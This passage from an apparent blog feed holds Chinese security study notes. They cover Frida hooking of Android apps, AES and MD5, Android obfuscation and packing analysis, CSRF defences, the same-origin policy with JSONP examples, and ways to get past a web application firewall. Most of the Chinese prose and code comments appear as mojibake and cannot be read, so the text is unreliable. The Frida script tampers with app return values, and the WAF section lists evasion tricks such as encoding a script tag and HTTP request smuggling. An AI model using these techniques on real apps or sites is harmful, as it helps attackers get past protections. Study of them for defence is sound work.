class="title function_">printstack</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Hookè½¯ä»¶åŒ…çš„ç±»åä¸ºï¼šcom.myclass</span></span><br><span class="line">        <span class="keyword">var</span> myclass= <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.myclass&#x27;</span>);</span><br><span class="line">        <span class="comment">//è°ƒç”¨Hookè½¯ä»¶åŒ…ç±»åä¸‹çš„æ–¹æ³•ï¼šmymethod</span></span><br><span class="line">        myclass.<span class="property">mymethod</span>.<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">bytearray</span>) &#123;</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&#x27;com.myclass.mymethod.implementation&#x27;</span>);</span><br><span class="line">            <span class="title function_">printstack</span>();</span><br><span class="line">            <span class="keyword">var</span> ret = <span class="variable language_">this</span>.<span class="title function_">mymethod</span>(bytearray);</span><br><span class="line">            <span class="title function_">send</span>(<span class="string">&quot;result:&quot;</span>+ret);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> addAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&#x27;libleidian.so&#x27;</span>, <span class="string">&#x27;Java_com_example_leidian_MainActivity_add&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> addFunction = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(addAddr, <span class="string">&#x27;int64&#x27;</span>, [<span class="string">&#x27;int64&#x27;</span>, <span class="string">&#x27;int64&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;int&#x27;</span>]);</span><br><span class="line">    <span class="keyword">const</span> result = <span class="title function_">addFunction</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;result: &quot;</span>, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr, &#123;</span><br><span class="line">    <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">        args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>) <span class="comment">// æŒ‡é’ˆç±»å‹å‚æ•° å’Œ æ•´æ•°ç±»å‹å‚æ•° ä¿®æ”¹</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="number">1337</span>) <span class="comment">// æ•´æ•°ç±»å‹è¿”å›å€¼æ›¿æ¢</span></span><br><span class="line">        retval.<span class="title function_">replace</span>(<span class="title function_">ptr</span>(<span class="string">&quot;0x1234&quot;</span>))<span class="comment">//æŒ‡é’ˆç±»å‹è¿”å›å€¼æ›¿æ¢ ï¼ˆæŒ‡é’ˆå…¶å®ä»ç„¶æ˜¯æ•°å€¼ï¼‰</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="AESå’ŒMD5ç®—æ³•çš„ä¸åŒä»¥åŠæ¯ä¸ªç®—æ³•çš„è¯¦ç»†æ­¥éª¤"><a href="#AESå’ŒMD5ç®—æ³•çš„ä¸åŒä»¥åŠæ¯ä¸ªç®—æ³•çš„è¯¦ç»†æ­¥éª¤" class="headerlink" title="AESå’ŒMD5ç®—æ³•çš„ä¸åŒä»¥åŠæ¯ä¸ªç®—æ³•çš„è¯¦ç»†æ­¥éª¤"></a>AESå’ŒMD5ç®—æ³•çš„ä¸åŒä»¥åŠæ¯ä¸ªç®—æ³•çš„è¯¦ç»†æ­¥éª¤</h3><ul><li><strong>AESç®—æ³•</strong><ul><li><strong>ä¸åŒç‚¹</strong>ï¼šAESæ˜¯ä¸€ç§å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œç”¨äºå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œè€ŒMD5æ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œç”¨äºç”Ÿæˆæ•°æ®çš„æ‘˜è¦ã€‚</li><li><strong>è¯¦ç»†æ­¥éª¤</strong><ol><li><strong>å¯†é’¥æ‰©å±•</strong>ï¼šå°†åŸå§‹å¯†é’¥æ‰©å±•æˆä¸€ç³»åˆ—çš„è½®å¯†é’¥ï¼Œç”¨äºæ¯ä¸€è½®çš„åŠ å¯†æ“ä½œã€‚</li><li><strong>åˆå§‹è½®</strong>ï¼šå°†æ˜æ–‡ä¸åˆå§‹å¯†é’¥è¿›è¡Œå¼‚æˆ–æ“ä½œã€‚</li><li><strong>å¤šè½®åŠ å¯†</strong>ï¼šè¿›è¡Œå¤šè½®ï¼ˆå¦‚10è½®ã€14è½®ç­‰ï¼‰çš„åŠ å¯†æ“ä½œï¼Œæ¯è½®åŒ…æ‹¬å­—èŠ‚æ›¿æ¢ã€è¡Œç§»ä½ã€åˆ—æ··æ·†å’Œè½®å¯†é’¥å¼‚æˆ–ç­‰æ­¥éª¤ã€‚</li><li><strong>æœ€ç»ˆè½®</strong>ï¼šæœ€åä¸€è½®ä¸è¿›è¡Œåˆ—æ··æ·†æ“ä½œï¼Œç›´æ¥è¿›è¡Œå­—èŠ‚æ›¿æ¢ã€è¡Œç§»ä½å’Œè½®å¯†é’¥å¼‚æˆ–ã€‚</li><li><strong>è§£å¯†è¿‡ç¨‹</strong>ï¼šä¸åŠ å¯†è¿‡ç¨‹ç›¸åï¼Œä½¿ç”¨ç›¸åº”çš„é€†æ“ä½œå’Œè½®å¯†é’¥è¿›è¡Œè§£å¯†ã€‚</li></ol></li></ul></li><li><strong>MD5ç®—æ³•</strong><ul><li><strong>ä¸åŒç‚¹</strong>ï¼šMD5æ˜¯ä¸€ç§å•å‘å“ˆå¸Œå‡½æ•°ï¼Œç”¨äºå°†ä»»æ„é•¿åº¦çš„æ•°æ®è½¬æ¢æˆå›ºå®šé•¿åº¦çš„æ‘˜è¦ï¼Œæ— æ³•é€šè¿‡å“ˆå¸Œå€¼åæ¨å‡ºåŸå§‹æ•°æ®ã€‚</li><li><strong>è¯¦ç»†æ­¥éª¤</strong><ol><li><strong>å¡«å……æ•°æ®</strong>ï¼šå°†è¾“å…¥æ•°æ®å¡«å……åˆ°æ»¡è¶³ç‰¹å®šé•¿åº¦è¦æ±‚çš„å€æ•°ã€‚</li><li><strong>é™„åŠ é•¿åº¦</strong>ï¼šåœ¨å¡«å……åçš„æ•°æ®æœ«å°¾é™„åŠ åŸå§‹æ•°æ®çš„é•¿åº¦ä¿¡æ¯ã€‚</li><li><strong>åˆå§‹åŒ–ç¼“å†²åŒº</strong>ï¼šè®¾ç½®å››ä¸ªåˆå§‹çš„32ä½ç¼“å†²åŒºå€¼ã€‚</li><li><strong>å¤„ç†æ•°æ®å—</strong>ï¼šå°†æ•°æ®åˆ†æˆå›ºå®šå¤§å°çš„å—ï¼Œå¯¹æ¯ä¸ªå—è¿›è¡Œå››è½®çš„å¤„ç†ï¼Œæ¯è½®åŒ…æ‹¬ä¸€ç³»åˆ—çš„é€»è¾‘è¿ç®—å’Œæ¨¡åŠ è¿ç®—ã€‚</li><li><strong>è¾“å‡ºå“ˆå¸Œå€¼</strong>ï¼šå°†å››ä¸ªç¼“å†²åŒºçš„å€¼è¿æ¥èµ·æ¥ï¼Œå½¢æˆæœ€ç»ˆçš„128ä½å“ˆå¸Œå€¼ã€‚</li></ol></li></ul></li></ul><h3 id="å¸¸è§çš„Androidæ··æ·†å’ŒåŠ å£³æ–¹å¼çš„ç‰¹å¾ä»¥åŠå…·ä½“åˆ†ææ–¹æ³•"><a href="#å¸¸è§çš„Androidæ··æ·†å’ŒåŠ å£³æ–¹å¼çš„ç‰¹å¾ä»¥åŠå…·ä½“åˆ†ææ–¹æ³•" class="headerlink" title="å¸¸è§çš„Androidæ··æ·†å’ŒåŠ å£³æ–¹å¼çš„ç‰¹å¾ä»¥åŠå…·ä½“åˆ†ææ–¹æ³•"></a>å¸¸è§çš„Androidæ··æ·†å’ŒåŠ å£³æ–¹å¼çš„ç‰¹å¾ä»¥åŠå…·ä½“åˆ†ææ–¹æ³•</h3><ul><li><strong>å¸¸è§çš„æ··æ·†æ–¹å¼åŠå…¶ç‰¹å¾</strong><ul><li><strong>ä»£ç æ··æ·†</strong>ï¼šé€šè¿‡æ”¹å˜ä»£ç çš„ç»“æ„å’Œé€»è¾‘ï¼Œå¦‚å˜é‡åæ›¿æ¢ã€ä»£ç å—æ‰“ä¹±ç­‰ï¼Œä½¿ä»£ç éš¾ä»¥é˜…è¯»å’Œç†è§£ã€‚ç‰¹å¾æ˜¯åœ¨åç¼–è¯‘åçš„ä»£ç ä¸­å‡ºç°å¤§é‡æ— æ„ä¹‰çš„å˜é‡åå’Œå¤æ‚çš„æ§åˆ¶æµã€‚</li><li><strong>å­—ç¬¦ä¸²åŠ å¯†</strong>ï¼šå¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŠ å¯†å¤„ç†ï¼Œé˜²æ­¢ç›´æ¥ä»ä»£ç ä¸­è·å–æ•æ„Ÿä¿¡æ¯ã€‚ç‰¹å¾æ˜¯åœ¨åç¼–è¯‘åçš„ä»£ç ä¸­å­—ç¬¦ä¸²ä»¥åŠ å¯†å½¢å¼å­˜åœ¨ï¼Œéœ€è¦åœ¨è¿è¡Œæ—¶è§£å¯†ã€‚</li><li><strong>æ§åˆ¶æµå¹³å¦åŒ–</strong>ï¼šå°†ç¨‹åºçš„æ§åˆ¶æµç»“æ„è¿›è¡Œå¹³å¦åŒ–å¤„ç†ï¼Œå¢åŠ æ§åˆ¶æµçš„å¤æ‚åº¦ã€‚ç‰¹å¾æ˜¯åç¼–è¯‘åçš„ä»£ç ä¸­å‡ºç°å¤§é‡çš„è·³è½¬å’Œæ¡ä»¶åˆ¤æ–­ï¼Œéš¾ä»¥ç†è§£ç¨‹åºçš„æ‰§è¡Œæµç¨‹ã€‚</li><li><strong>èµ„æºæ–‡ä»¶åŠ å¯†</strong>ï¼šå¯¹åº”ç”¨çš„èµ„æºæ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œé˜²æ­¢ç›´æ¥æå–å’Œä½¿ç”¨ã€‚ç‰¹å¾æ˜¯èµ„æºæ–‡ä»¶æ— æ³•ç›´æ¥è¢«è¯»å–ï¼Œéœ€è¦åœ¨è¿è¡Œæ—¶è§£å¯†ã€‚</li><li><strong>åå°„è°ƒç”¨</strong>ï¼šé€šè¿‡åå°„æœºåˆ¶åŠ¨æ€åŠ è½½ç±»å’Œè°ƒç”¨æ–¹æ³•ï¼Œéšè—ä»£ç çš„è°ƒç”¨å…³ç³»ã€‚ç‰¹å¾æ˜¯åœ¨ä»£ç ä¸­å¤§é‡ä½¿ç”¨<code>Class.forName</code>å’Œ<code>Method.invoke</code>ç­‰åå°„ç›¸å…³çš„æ–¹æ³•ã€‚</li></ul></li><li><strong>å¸¸è§çš„åŠ å£³æ–¹å¼åŠå…¶ç‰¹å¾</strong><ul><li><strong>é™æ€åŠ å£³</strong>ï¼šåœ¨ç¨‹åºç¼–è¯‘åå¯¹å¯æ‰§è¡Œæ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œæ·»åŠ å£³ä»£ç ä»¥å®ç°ä¿æŠ¤åŠŸèƒ½ã€‚ç‰¹å¾æ˜¯å¯æ‰§è¡Œæ–‡ä»¶çš„ç»“æ„å‘ç”Ÿå˜åŒ–ï¼Œé€šå¸¸ä¼šå¢åŠ é¢å¤–çš„æ®µæˆ–ä¿®æ”¹å…¥å£ç‚¹ã€‚</li><li><strong>åŠ¨æ€åŠ å£³</strong>ï¼šåœ¨ç¨‹åºè¿è¡Œæ—¶é€šè¿‡åŠ¨æ€åŠ è½½å£³ä»£ç æ¥å®ç°ä¿æŠ¤ã€‚ç‰¹å¾æ˜¯åœ¨è¿è¡Œæ—¶ä¼šåŠ è½½é¢å¤–çš„åŠ¨æ€åº“æˆ–ä»£ç ç‰‡æ®µï¼Œè¿™äº›ä»£ç è´Ÿè´£å¯¹ç¨‹åºè¿›è¡Œä¿æŠ¤å’Œæ§åˆ¶ã€‚</li></ul></li><li><strong>å…·ä½“åˆ†ææ–¹æ³•</strong><ul><li><strong>åç¼–è¯‘åˆ†æ</strong>ï¼šä½¿ç”¨åç¼–è¯‘å·¥å…·ï¼ˆå¦‚apktoolã€JEBç­‰ï¼‰å¯¹Androidåº”ç”¨è¿›è¡Œåç¼–è¯‘ï¼ŒæŸ¥çœ‹ä»£ç å’Œèµ„æºæ–‡ä»¶ï¼Œè¯†åˆ«æ··æ·†å’ŒåŠ å£³çš„ç‰¹å¾ã€‚</li><li><strong>åŠ¨æ€è°ƒè¯•</strong>ï¼šé€šè¿‡è°ƒè¯•å·¥å…·ï¼ˆå¦‚Fridaã€Xposedç­‰ï¼‰åœ¨ç¨‹åºè¿è¡Œæ—¶è¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œæˆªè·å…³é”®å‡½æ•°çš„è°ƒç”¨å’Œæ•°æ®æµåŠ¨ï¼Œåˆ†æåŠ å£³å’Œæ··æ·†åçš„å®é™…è¡Œä¸ºã€‚</li><li><strong>å†…å­˜åˆ†æ</strong>ï¼šä½¿ç”¨å†…å­˜åˆ†æå·¥å…·ï¼ˆå¦‚Memory Analyzerï¼‰æŸ¥çœ‹ç¨‹åºè¿è¡Œæ—¶çš„å†…å­˜çŠ¶æ€ï¼Œåˆ†æå£³ä»£ç çš„åŠ è½½å’Œæ‰§è¡Œæƒ…å†µï¼Œä»¥åŠè§£å¯†åçš„ä»£ç å’Œæ•°æ®ã€‚</li><li><strong>ç‰¹å¾æ¯”å¯¹</strong>ï¼šå°†åˆ†æç»“æœä¸å·²çŸ¥çš„æ··æ·†å’ŒåŠ å£³æŠ€æœ¯çš„ç‰¹å¾è¿›è¡Œæ¯”å¯¹ï¼Œç¡®å®šå…·ä½“ä½¿ç”¨çš„æŠ€æœ¯å’Œå®ç°æ–¹å¼ã€‚</li></ul></li></ul><h2 id="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„ä»‹ç»ä¸é˜²æŠ¤"><a href="#CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„ä»‹ç»ä¸é˜²æŠ¤" class="headerlink" title="CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„ä»‹ç»ä¸é˜²æŠ¤"></a>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰çš„ä»‹ç»ä¸é˜²æŠ¤</h2><ul><li><p><strong>CSRFçš„ä»‹ç»</strong></p><ul><li>CSRFæ˜¯ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ”»å‡»è€…è¯±å¯¼å·²ç™»å½•æŸç½‘ç«™çš„ç”¨æˆ·æµè§ˆå™¨ï¼Œå‘è¯¥ç½‘ç«™å‘é€ä¼ªé€ çš„è¯·æ±‚ï¼Œä»è€Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æ‰§è¡Œæ“ä½œã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªæ¶æ„çš„è¡¨å•æˆ–é“¾æ¥ï¼Œå½“ç”¨æˆ·ç‚¹å‡»æˆ–æäº¤æ—¶ï¼Œç”¨æˆ·çš„æµè§ˆå™¨ä¼šå‘å…¶å·²ç™»å½•çš„é“¶è¡Œç½‘ç«™å‘é€è½¬è´¦è¯·æ±‚ï¼Œå¯¼è‡´ç”¨æˆ·çš„èµ„é‡‘è¢«ç›—ç”¨ã€‚</li></ul></li><li><p><strong>CSRFçš„é˜²æŠ¤æ–¹æ³•</strong></p><ul><li><strong>ä½¿ç”¨CSRFä»¤ç‰Œ</strong>ï¼šåœ¨æœåŠ¡å™¨ç”Ÿæˆå”¯ä¸€çš„CSRFä»¤ç‰Œï¼Œå¹¶å°†å…¶åµŒå…¥åˆ°æ¯ä¸ªè¡¨å•æˆ–è¯·æ±‚ä¸­ã€‚å®¢æˆ·ç«¯åœ¨æäº¤è¯·æ±‚æ—¶å¿…é¡»åŒ…å«è¯¥ä»¤ç‰Œï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚æ—¶éªŒè¯ä»¤ç‰Œçš„åˆæ³•æ€§ã€‚è¿™æ ·å¯ä»¥ç¡®ä¿è¯·æ±‚æ˜¯ç”±ç”¨æˆ·çš„çœŸå®æ„æ„¿å‘èµ·çš„ï¼Œè€Œä¸æ˜¯è¢«ä¼ªé€ çš„è¯·æ±‚ã€‚</li><li><strong>éªŒè¯HTTPå¤´ä¿¡æ¯</strong>ï¼šæ£€æŸ¥è¯·æ±‚ä¸­çš„<code>Referer</code>å¤´ï¼Œç¡®ä¿è¯·æ±‚æ¥è‡ªåˆæ³•çš„æ¥æºé¡µé¢ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„HTTPå¤´ï¼Œå¦‚<code>X-CSRF-Token</code>ï¼Œåœ¨æœåŠ¡å™¨ç«¯éªŒè¯è¯¥å¤´æ˜¯å¦å­˜åœ¨å’Œæœ‰æ•ˆã€‚</li><li><strong>ä½¿ç”¨SameSiteå±æ€§</strong>ï¼šåœ¨è®¾ç½®Cookieæ—¶ï¼Œä½¿ç”¨<code>SameSite</code>å±æ€§ï¼ˆå¦‚<code>SameSite=Strict</code>æˆ–<code>SameSite=Lax</code>ï¼‰ï¼Œé™åˆ¶Cookieåœ¨è·¨ç«™è¯·æ±‚æ—¶æ˜¯å¦è¢«å‘é€ã€‚è¿™æ ·å¯ä»¥å‡å°‘CSRFæ”»å‡»ä¸­Cookieè¢«è‡ªåŠ¨æäº¤çš„å¯èƒ½æ€§ã€‚</li><li><strong>ç”¨æˆ·æ•™è‚²</strong>ï¼šæé†’ç”¨æˆ·ä¸è¦éšæ„ç‚¹å‡»ä¸å¯ä¿¡çš„é“¾æ¥æˆ–è®¿é—®ä¸æ˜æ¥æºçš„ç½‘ç«™ï¼Œæé«˜ç”¨æˆ·çš„å®‰å…¨æ„è¯†ï¼Œå‡å°‘è¢«CSRFæ”»å‡»çš„é£é™©ã€‚</li></ul></li></ul><h3 id="åŒæºç­–ç•¥ä¸JSONPç»•è¿‡åŒæºç­–ç•¥çš„æ–¹å¼"><a href="#åŒæºç­–ç•¥ä¸JSONPç»•è¿‡åŒæºç­–ç•¥çš„æ–¹å¼" class="headerlink" title="åŒæºç­–ç•¥ä¸JSONPç»•è¿‡åŒæºç­–ç•¥çš„æ–¹å¼"></a>åŒæºç­–ç•¥ä¸JSONPç»•è¿‡åŒæºç­–ç•¥çš„æ–¹å¼</h3><ul><li><p><strong>åŒæºç­–ç•¥</strong></p><ul><li>åŒæºç­–ç•¥æ˜¯ä¸€ç§å®‰å…¨ç­–ç•¥ï¼Œé™åˆ¶äº†æ¥è‡ªä¸åŒæºçš„æ–‡æ¡£æˆ–è„šæœ¬å¦‚ä½•è·å–å’Œäº¤äº’å…¶ä»–æºçš„èµ„æºã€‚åŒæºæ˜¯æŒ‡åè®®ã€åŸŸåå’Œç«¯å£å·éƒ½ç›¸åŒçš„æ¥æºã€‚ä¾‹å¦‚ï¼Œ<code>http://example.com:8080</code>å’Œ<code>https://example.com:8080</code>è¢«è®¤ä¸ºæ˜¯ä¸åŒæºï¼Œå› ä¸ºåè®®ä¸åŒã€‚åŒæºç­–ç•¥çš„ä¸»è¦ç›®çš„æ˜¯é˜²æ­¢æ¶æ„ç½‘ç«™è·å–å…¶ä»–ç½‘ç«™çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚Cookieã€æœ¬åœ°å­˜å‚¨ç­‰ã€‚</li></ul></li><li><p><strong>JSONPç»•è¿‡åŒæºç­–ç•¥çš„æ–¹å¼</strong></p><ul><li>JSONPï¼ˆJSON with Paddingï¼‰æ˜¯ä¸€ç§è·¨åŸŸæ•°æ®è¯·æ±‚çš„æ–¹å¼ï¼Œå®ƒåˆ©ç”¨äº†<code>&lt;script&gt;</code>æ ‡ç­¾çš„<code>src</code>å±æ€§ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„ç‰¹ç‚¹ã€‚å…¶å·¥ä½œåŸç†æ˜¯ï¼š<ol><li>å®¢æˆ·ç«¯åœ¨é¡µé¢ä¸­åŠ¨æ€åˆ›å»ºä¸€ä¸ª<code>&lt;script&gt;</code>æ ‡ç­¾ï¼Œå°†<code>src</code>å±æ€§è®¾ç½®ä¸ºç›®æ ‡æœåŠ¡å™¨çš„APIåœ°å€ï¼Œå¹¶åœ¨è¯·æ±‚å‚æ•°ä¸­æŒ‡å®šä¸€ä¸ªå›è°ƒå‡½æ•°åã€‚</li><li>ç›®æ ‡æœåŠ¡å™¨æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå°†æ•°æ®ä»¥JavaScriptå‡½æ•°è°ƒç”¨çš„å½¢å¼è¿”å›ï¼Œå‡½æ•°åä¸å®¢æˆ·ç«¯æŒ‡å®šçš„å›è°ƒå‡½æ•°åä¸€è‡´ï¼Œæ•°æ®ä½œä¸ºå‚æ•°ä¼ é€’ç»™è¯¥å‡½æ•°ã€‚</li><li>å®¢æˆ·ç«¯æµè§ˆå™¨è§£æå¹¶æ‰§è¡Œè¿”å›çš„è„šæœ¬ï¼Œè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œä»è€Œå®ç°äº†è·¨åŸŸçš„æ•°æ®è·å–å’Œå¤„ç†ã€‚</li></ol></li><li>ä¾‹å¦‚ï¼Œå®¢æˆ·ç«¯ä»£ç ï¼š  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;è·¨åŸŸçš„å›¾ç‰‡åœ°å€&quot;</span>&gt;</span> å¯ä»¥ç”¨äºç»Ÿè®¡æ‰“ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨ç¬¬ä¸‰æ–¹ç»Ÿè®¡æœåŠ¡ï¼Ÿï¼Ÿï¼Ÿ</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;è·¨åŸŸçš„CSSåœ°å€&quot;</span>&gt;</span> å¯ä»¥ä½¿ç”¨CDN,ä¸€èˆ¬å¤–åŸŸ</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;è·¨åŸŸçš„jsåœ°å€&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> å®ç°JSONP????å…·ä½“å®ç°</span><br><span class="line">// ä¸Šé¢çš„æ–¹å¼éƒ½å¯ä»¥è·¨åŸŸ</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">handleResponse</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// å¤„ç†è¿”å›çš„æ•°æ®</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://api.example.com/data?callback=handleResponse&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>  ç›®æ ‡æœåŠ¡å™¨è¿”å›ï¼š  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">handleResponse</span>(&#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>  è¿™æ ·å°±ç»•è¿‡äº†åŒæºç­–ç•¥çš„é™åˆ¶ï¼Œå®ç°äº†è·¨åŸŸçš„æ•°æ®äº¤äº’ã€‚<br>  å¦å¤–ï¼ŒCORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰ä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆï¼Œå®ƒé€šè¿‡æœåŠ¡ç«¯è®¾ç½®ç‰¹å®šçš„ HTTP å¤´ï¼ˆå¦‚ Access-Control-Allow-Originï¼‰æ¥å…è®¸ä¸åŒæºçš„è¯·æ±‚ï¼Œå®ç°è·¨åŸŸèµ„æºå…±äº«ã€‚ä¸ JSONP ä¸åŒï¼ŒCORS çš„å®ç°ä¸»è¦åœ¨æœåŠ¡ç«¯ï¼Œä¸”æ”¯æŒå¤šç§ HTTP æ–¹æ³•ï¼ˆå¦‚ GETã€POSTã€PUTã€DELETE ç­‰ï¼‰ã€‚</li></ul></li></ul><h2 id="ç»•è¿‡WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰çš„å¸¸è§æ–¹æ³•"><a href="#ç»•è¿‡WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰çš„å¸¸è§æ–¹æ³•" class="headerlink" title="ç»•è¿‡WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰çš„å¸¸è§æ–¹æ³•"></a>ç»•è¿‡WAFï¼ˆWebåº”ç”¨é˜²ç«å¢™ï¼‰çš„å¸¸è§æ–¹æ³•</h2><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120926097%E3%80%81https://cloud.tencent.com/developer/article/2315120">https://blog.csdn.net/weixin_50464560/article/details/120926097ã€https://cloud.tencent.com/developer/article/2315120</a></p><ul><li><strong>å¸¸è§çš„WAFç»•è¿‡æ–¹æ³•</strong><ul><li><strong>ç¼–ç ç»•è¿‡</strong>ï¼šå¯¹æ”»å‡»payloadè¿›è¡Œç¼–ç å¤„ç†ï¼Œå¦‚ä½¿ç”¨URLç¼–ç ã€Unicodeç¼–ç ã€Base64ç¼–ç ç­‰ï¼Œä½¿WAFæ— æ³•æ­£ç¡®è¯†åˆ«å‡ºæ”»å‡»ç‰¹å¾ã€‚ä¾‹å¦‚ï¼Œå°†<code>&lt;script&gt;</code>ç¼–ç ä¸º<code>%3Cscript%3E</code>ï¼Œç»•è¿‡WAFå¯¹ç‰¹å®šæ ‡ç­¾çš„æ£€æµ‹ã€‚</li><li><strong>åˆ†æ®µæ”»å‡»</strong>ï¼šå°†æ”»å‡»payloadåˆ†æˆå¤šä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«å‘é€åˆ°æœåŠ¡å™¨ï¼Œç„¶ååœ¨æœåŠ¡å™¨ç«¯è¿›è¡Œæ‹¼æ¥å’Œæ‰§è¡Œã€‚è¿™æ ·å¯ä»¥é¿å…å®Œæ•´çš„æ”»å‡»ç‰¹å¾è¢«WAFæ•è·ã€‚<a href="https://blog.csdn.net/weixin_43571641/article/details/123116234">å¯ä»¥çœ‹ä¸‹è¿™ä¸ªåšå®¢çš„è®²è§£</a></li><li><strong>åˆ©ç”¨HTTPè¯·æ±‚èµ°ç§</strong>ï¼šé€šè¿‡æ“çºµHTTPè¯·æ±‚çš„å¤´éƒ¨å’Œæ¶ˆæ¯ä½“ï¼Œä½¿ä¸åŒçš„æœåŠ¡å™¨æˆ–ç»„ä»¶å¯¹è¯·æ±‚çš„è§£æä¸ä¸€è‡´ï¼Œä»è€Œç»•è¿‡WAFçš„æ£€æµ‹å¹¶å°†æ¶æ„è¯·æ±‚ä¼ é€’ç»™ç›®æ ‡æœåŠ¡å™¨ã€‚<a href="https://forum.butian.net/share/1876">è¿™ä¸ªè®²çš„å¾ˆå¥½</a></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€ç®—æ³•ã€‘å®æˆ˜é¢˜ç›®</title>
      <link href="/2024/03/26/algorithm/workalgorithm/"/>
      <url>/2024/03/26/algorithm/workalgorithm/</url>
      
